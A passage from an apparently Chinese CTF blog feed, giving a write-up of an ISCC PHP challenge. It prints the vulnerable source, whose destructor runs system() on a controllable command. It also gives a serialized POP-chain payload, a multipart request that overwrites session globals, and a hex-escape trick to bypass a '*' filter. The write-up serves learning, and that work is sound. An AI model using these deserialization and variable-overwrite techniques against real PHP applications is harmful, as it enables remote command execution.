class="line">▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒██</span><br><span class="line">████████████▒▒██████████████████▒▒▒▒▒▒▒▒▒▒▒▒██████████████████▒▒▒▒▒▒▒▒██████████████████</span><br><span class="line">████████████▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒</span><br><span class="line">--&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;//cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;snowfall&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    particlesJS(<span class="string">&quot;snowfall&quot;</span>, &#123;</span><br><span class="line">        <span class="string">&quot;particles&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;number&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;value&quot;</span>: <span class="number">100</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;shape&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;circle&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;size&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;value&quot;</span>: <span class="number">10</span>,</span><br><span class="line">                <span class="string">&quot;random&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;line_linked&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;enable&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;move&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;enable&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;speed&quot;</span>: <span class="number">2</span>,</span><br><span class="line">                <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;bottom&quot;</span>,</span><br><span class="line">                <span class="string">&quot;straight&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;interactivity&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;detect_on&quot;</span>: <span class="string">&quot;canvas&quot;</span>,</span><br><span class="line">            <span class="string">&quot;events&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;onhover&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;enable&quot;</span>: <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;modes&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;push&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;particles_nb&quot;</span>: <span class="number">12</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">&lt;a href=<span class="string">&quot;/?whatareyounongshane=src&quot;</span>&gt;我真的是源码?&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;/?whatareyounongshane=cmd&quot;</span>&gt;干点好事!&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;/?whatareyounongshane=upload&quot;</span>&gt;送点东西!&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;/?whatareyounongshane=tellmetruth&quot;</span>&gt;快告诉我真相!&lt;/a&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">所以哪个ISCC是真的？</span><br></pre></td></tr></table></figure>



<p>然后能支离破碎的把每一处的问题解决，比如session变量覆盖isccIsCciScc1scc，但是我却找不到怎么把他们穿起来，后来问了带师傅才知道原来可以强行的把他们穿起来,payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cmd = <span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">$upload = <span class="keyword">new</span> ISCC_Upload();</span><br><span class="line">$tellme = <span class="keyword">new</span> ISCC_TellMeTruth();</span><br><span class="line">$com = <span class="keyword">new</span> ISCC_Command();</span><br><span class="line">$upload-&gt;staasdtus = $cmd;</span><br><span class="line">$cmd-&gt;is_upload = $tellme;</span><br><span class="line">$cmd-&gt;status = $com;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见upload这个类是没有我随便写的这个属性的，但是依然不影响我们进行操作，destruct和 wakeup依然会执行，既然知道这个知识点那么就很简单了，直接把他们连起来就可以了</p>
<p>思路:</p>
<p> 修改session-&gt;控制cmd-&gt;执行</p>
<p>图片上传的时候同时再穿一个text上去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryANIrb3jmbjSiBlbn</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;_SESSION&quot;; filename&#x3D;&quot;isccIsCciScc1scc&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">wdnmd</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">$status = <span class="string">&quot;new&quot;</span>;</span><br><span class="line">$cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$is_unser_finished = <span class="literal">false</span>;</span><br><span class="line">$iscc_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = (count($_FILES) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $iscc_file;</span><br><span class="line">        $status = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">                $GLOBALS[$key] = $value;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file($iscc_file[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $check = @getimagesize($iscc_file[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    $target_dir = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    $target_file = $target_dir . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ($iscc_file[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($iscc_file[<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;我拿到了！&lt;br&gt;&quot;</span>;</span><br><span class="line">                        $iscc_file = $target_file;</span><br><span class="line">                        $status = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;拿不到:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $new_cmd=<span class="string">&quot;ls&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\00\2A\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\00\2A\00new_cmd&quot;;s:6:&quot;whoami&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&quot;你这罐子是空的!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&#x27;东西都没给对!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $status = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            $cmd = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $flag = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        $pAssM0rd = hash(<span class="string">&quot;sha256&quot;</span>, $flag);</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&#x27;pAssM0rd&#x27;</span>] === $pAssM0rd)</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;看看你干的好事: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $is_unser_finished;</span><br><span class="line">        $status = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_unser_finished === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system($cmd);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params">$len</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $characters = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    $randstring = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $randstring .= $characters[rand(<span class="number">0</span>, strlen($characters))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randstring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line">    <span class="keyword">if</span>(stripos($s, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $is_upload = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">    @unlink($iscc_file);</span><br><span class="line">    $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    $whatareyounongshane = $_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($whatareyounongshane) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;想越级干好事？还是有门的……&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            $resp = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> $resp;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;空空如也就是我！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cmd = <span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">$upload = <span class="keyword">new</span> ISCC_Upload();</span><br><span class="line">$tellme = <span class="keyword">new</span> ISCC_TellMeTruth();</span><br><span class="line">$com = <span class="keyword">new</span> ISCC_Command();</span><br><span class="line">$upload-&gt;staasdtus = $cmd;</span><br><span class="line">$cmd-&gt;is_upload = $tellme;</span><br><span class="line">$cmd-&gt;status = $com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize($upload));</span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:2:&#123;s:10:&quot;\00\2A\00new_cmd&quot;;s:2:&quot;ls&quot;;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:9:&quot;staasdtus&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\00\2A\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:11:&quot;ISCC_Upload&quot;:1:&#123;s:6:&quot;status&quot;;O:13:&quot;ISCC_ResetCMD&quot;:3:&#123;S:10:&quot;\00\2A\00new_cmd&quot;;s:2:&quot;ls&quot;;s:9:&quot;is_upload&quot;;O:16:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;s:6:&quot;status&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(($a)) &#123;</span><br><span class="line"></span><br><span class="line">    $wtf = waf($a) ? $a : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;试试就“逝世”!&quot;</span>));</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line"><span class="comment">//    echo $wtf;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($goodshit = @unserialize($wtf)) &#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $is_unser_finished = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//        var_dump($is_unser_finished);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line"><span class="comment">//    var_dump(unserialize(&quot;O:11:\&quot;ISCC_Upload\&quot;:1:&#123;s:6:\&quot;status\&quot;;O:13:\&quot;ISCC_ResetCMD\&quot;:3:&#123;S:10:\&quot;\00\2A\00new_cmd\&quot;;s:6:\&quot;whoami\&quot;;s:9:\&quot;is_upload\&quot;;O:16:\&quot;ISCC_TellMeTruth\&quot;:0:&#123;&#125;s:6:\&quot;status\&quot;;O:12:\&quot;ISCC_Command\&quot;:0:&#123;&#125;&#125;&#125;&quot;));</span></span><br><span class="line">    var_dump($status);</span><br><span class="line">    <span class="keyword">if</span>(in_array($status, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;\n所以哪个ISCC是真的？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过 * 操作：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当PHP反序列化的s换成S的时候就可以是用十六进制来操作~</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ISCC_Upload&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;staasdtus&quot;</span>;O:<span class="number">13</span>:<span class="string">&quot;ISCC_ResetCMD&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; * new_cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;is_upload&quot;</span>;O:<span class="number">16</span>:<span class="string">&quot;ISCC_TellMeTruth&quot;</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">6</span>:<span class="string">&quot;status&quot;</span>;O:<span class="number">12</span>:<span class="string">&quot;ISCC_Command&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ISCC_Upload&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;status&quot;</span>;O:<span class="number">13</span>:<span class="string">&quot;ISCC_ResetCMD&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">10</span>:<span class="string">&quot;\00\2A\00new_cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;is_upload&quot;</span>;O:<span class="number">16</span>:<span class="string">&quot;ISCC_TellMeTruth&quot;</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">6</span>:<span class="string">&quot;status&quot;</span>;O:<span class="number">12</span>:<span class="string">&quot;ISCC_Command&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscnlaravel</title>
